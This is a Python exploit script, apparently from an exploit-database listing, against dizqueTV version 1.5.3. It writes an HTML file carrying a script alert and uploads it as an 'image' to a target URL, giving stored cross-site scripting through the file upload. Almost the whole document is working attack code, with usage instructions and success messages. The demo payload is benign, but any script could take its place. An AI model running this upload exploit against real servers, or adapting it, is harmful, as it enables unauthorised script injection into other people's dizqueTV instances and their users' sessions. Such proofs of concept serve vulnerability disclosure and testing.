#!/usr/bin/env python3
# Exploit Title: dizqueTV - File Upload to XSS
# Date: 10/21/2024
# Exploit Author: J3rich0123
# Vendor Homepage: https://github.com/vexorian/dizquetv
# Version: 1.5.3 (REQUIRED)
# Tested on: Linux

import requests
import os
import sys

def exploit_upload(url, malicious_filename):
    try:
        with open(malicious_filename, "rb") as thefile:
            print(f"Reading malicious file: {malicious_filename}")
            file_content = thefile.read()

        files = {
            'image': (malicious_filename, file_content, 'text/html')  # Adjust MIME type if necessary
        }

        print(f"Uploading malicious file: {malicious_filename}")
        response = requests.post(url, files=files)

        if response.status_code == 200:
            print(f"Exploit successful! Attempted to upload: {malicious_filename}")
            print(f"Server response: {response.text}")
        else:
            print(f"Exploit failed with status code: {response.status_code}. Response: {response.text}")

    except FileNotFoundError:
        print(f"Error: The file {malicious_filename} was not found.")
    except requests.exceptions.RequestException as e:
        print(f"HTTP request error: {str(e)}")
    except Exception as e:
        print(f"An unexpected error occurred: {str(e)}")

def create_file(filename):
    payload = """\
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XSS Payload</title>
    <script>
        alert("Hacked!!!");
    </script>
</head>
<body>
    <h1>Testing XSS Payload</h1>
    <p>If the alert shows, the XSS attack was successful!</p>
</body>
</html>
"""
    with open(filename, 'w') as f:
        print(f"Creating file: {filename}")
        f.write(payload)
    print(f"File created: {filename}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python exploit.py <target_url>")
        sys.exit(1)

    target_url = sys.argv[1]
    malicious_file = 'xss.html'
    create_file(malicious_file)
    exploit_upload(target_url, malicious_file)
    
    if os.path.exists(malicious_file):
        os.remove(malicious_file)
        print("Malicious file deleted successfully.")
